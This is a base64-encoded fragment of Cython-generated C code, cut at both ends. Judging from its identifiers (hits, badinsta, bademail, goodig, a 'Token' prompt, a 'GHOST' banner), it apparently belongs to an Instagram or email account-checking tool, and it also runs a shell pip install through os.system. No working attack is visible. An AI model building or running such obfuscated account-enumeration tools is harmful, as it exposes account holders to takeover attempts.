fX3B5eF90XzUgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgZ290byBfX3B5eF9MMTExX3RyeV9lbmQ7CiAgICBfX3B5eF9MMTA2X2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgCiAgICAgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMiwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfMykgPCAwKSBfX1BZWF9FUlIoMCwgNzAsIF9fcHl4X0wxMDhfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxMDhfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMTA4X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgX19weXhfdF82ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX2NvbG9yYW1hfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxMDhfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBnb3RvIF9fcHl4X0wxMDdfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CgogICAgCiAgICBfX3B5eF9MMTA4X2V4Y2VwdF9lcnJvcjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MMTA3X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgX19weXhfTDExMV90cnlfZW5kOjsKICB9CgogIAogIF9fcHl4X3RfNSA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTR9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JsYWNrLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxhY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CgogIAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDUgOiAwKV0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1R9OwogICAgX19weXhfdF8xMCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mb250LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxvY2ssIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29sb3JzLCBfX3B5eF90XzQsIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWxpZ24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZW50ZXIsIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFja2dyb3VuZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3llbGxvdywgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMiwgMykgPCAoMCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGFjZSwgUHlfVHJ1ZSwgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMiwgNCkgPCAoMCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX3B5eF90XzMgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMTApOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2dvLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzUgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICBfX3B5eF90XzEwID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2dvKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNzYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF80fTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMTAgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICBfX3B5eF90XzQgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNH07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzQgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNzgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zbGVlcCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDc4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzF9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3OCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG90YWwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgwLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oaXRzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4MSwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkaW5zdGEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRlbWFpbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYiwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF8xMlswXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNTsKICBfX3B5eF90XzEyWzFdID0gX19weXhfdF81OwogIF9fcHl4X3RfMTJbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbTsKICBfX3B5eF90XzMgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzEyLCAzLCA3ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIDEsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ibywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF81ID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgX19weXhfdF8xMCA9IF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzM5bSwgNjApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgODcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfMTB9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzQgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTsKICBfX3B5eF90XzEwID0gX19weXhfYnVpbHRpbl9pbnB1dDsgCiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNX07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1Rva2VuLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgODgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzEwID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgX19we